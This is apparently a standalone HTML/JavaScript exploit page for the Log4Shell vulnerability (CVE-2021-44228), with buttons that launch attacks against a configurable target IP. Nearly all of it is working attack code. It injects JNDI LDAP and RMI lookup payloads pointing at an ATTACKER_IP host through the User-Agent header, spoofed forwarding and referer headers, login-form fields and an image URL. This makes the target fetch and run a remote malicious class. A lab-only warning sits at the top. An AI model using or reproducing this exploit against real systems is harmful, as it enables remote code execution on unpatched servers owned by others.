<!DOCTYPE html>
<html>
<head>
    <title>Log4Shell Browser Exploit Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        .exploit-btn { background: #ff4444; color: white; padding: 15px 30px;
                       border: none; cursor: pointer; font-size: 18px; margin: 10px; }
        .exploit-btn:hover { background: #cc0000; }
        .warning { background: #ffeeee; border: 2px solid #ff0000; padding: 15px; margin: 20px 0; }
        .info { background: #eeeeff; border: 2px solid #0000ff; padding: 15px; margin: 20px 0; }
        pre { background: #f0f0f0; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Log4Shell (CVE-2021-44228) Browser Exploitation Demo</h1>

        <div class="warning">
            <strong>‚ö†Ô∏è WARNING:</strong> This page demonstrates Log4Shell vulnerability exploitation.
            Only use in controlled lab environments for security education purposes.
        </div>

        <div class="info">
            <strong>‚ÑπÔ∏è Setup Required:</strong>
            <ul>
                <li>Vulnerable app running on target server</li>
                <li>LDAP server running (marshalsec)</li>
                <li>HTTP server serving malicious class</li>
                <li>Replace "TARGET_IP" below with actual target IP</li>
            </ul>
        </div>

        <h2>Exploit Methods:</h2>

        <!-- User-Agent Header Exploit -->
        <h3>1. User-Agent Header Injection</h3>
        <button class="exploit-btn" onclick="exploitUserAgent()">
            Launch User-Agent Exploit
        </button>

        <!-- XHR with Custom Headers -->
        <h3>2. Custom Header Injection</h3>
        <button class="exploit-btn" onclick="exploitCustomHeaders()">
            Launch Custom Header Exploits
        </button>

        <!-- Form Submission -->
        <h3>3. Form Data Injection</h3>
        <form id="exploitForm" onsubmit="exploitForm(event)">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="exploit-btn">Submit Login (Exploit)</button>
        </form>

        <!-- Image/Resource Loading -->
        <h3>4. Resource Loading Exploit</h3>
        <button class="exploit-btn" onclick="exploitImage()">
            Trigger Image Request Exploit
        </button>

        <h2>Exploitation Status:</h2>
        <div id="status" style="background: #f0f0f0; padding: 15px; min-height: 100px;">
            Click exploit buttons above to see results...
        </div>

        <h2>JNDI Payloads Used:</h2>
        <pre id="payloads">
${jndi:ldap://ATTACKER_IP:1389/Exploit}
${jndi:ldap://127.0.0.1:1389/Exploit}
${jndi:rmi://ATTACKER_IP:1099/Exploit}
        </pre>
    </div>

    <script>
        // Replace with your actual target server IP
        const TARGET_IP = '192.168.1.100';  // CHANGE THIS
        const ATTACKER_IP = '127.0.0.1';     // CHANGE THIS if remote

        const payload = `\${jndi:ldap://${ATTACKER_IP}:1389/Exploit}`;

        function log(message) {
            const status = document.getElementById('status');
            status.innerHTML += new Date().toLocaleTimeString() + ': ' + message + '<br>';
            status.scrollTop = status.scrollHeight;
        }

        function exploitUserAgent() {
            log('üöÄ Launching User-Agent header exploit...');

            fetch(`http://${TARGET_IP}:8080/`, {
                method: 'GET',
                headers: {
                    'User-Agent': payload,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
            }).then(response => {
                log('‚úÖ User-Agent exploit request sent - check target for calc.exe');
                return response.text();
            }).then(data => {
                log('üì° Response received from target');
            }).catch(error => {
                log('‚ùå Error: ' + error.message);
            });
        }

        function exploitCustomHeaders() {
            log('üöÄ Launching custom header exploits...');

            const headers = [
                {'X-Forwarded-For': payload},
                {'X-Real-IP': payload},
                {'X-Originating-IP': payload},
                {'X-Remote-IP': payload},
                {'X-Remote-Addr': payload},
                {'Referer': payload},
                {'Origin': payload}
            ];

            headers.forEach((header, index) => {
                setTimeout(() => {
                    const headerName = Object.keys(header)[0];
                    fetch(`http://${TARGET_IP}:8080/`, {
                        method: 'GET',
                        headers: header
                    }).then(() => {
                        log(`‚úÖ ${headerName} exploit sent`);
                    }).catch(error => {
                        log(`‚ùå ${headerName} failed: ${error.message}`);
                    });
                }, index * 500);
            });
        }

        function exploitForm(event) {
            event.preventDefault();
            log('üöÄ Launching form data exploit...');

            const formData = new FormData();
            formData.append('username', payload);
            formData.append('password', 'password123');

            fetch(`http://${TARGET_IP}:8080/`, {
                method: 'POST',
                body: formData
            }).then(response => {
                log('‚úÖ Form exploit sent - check target for calc.exe');
            }).catch(error => {
                log('‚ùå Form exploit error: ' + error.message);
            });
        }

        function exploitImage() {
            log('üöÄ Launching image request exploit...');

            const img = new Image();
            img.onerror = () => log('‚úÖ Image request exploit triggered');
            img.src = `http://${TARGET_IP}:8080/image.jpg?user=${encodeURIComponent(payload)}`;
        }

        // Auto-update payloads display
        document.getElementById('payloads').textContent =
            document.getElementById('payloads').textContent.replace(/ATTACKER_IP/g, ATTACKER_IP);
    </script>
</body>
</html>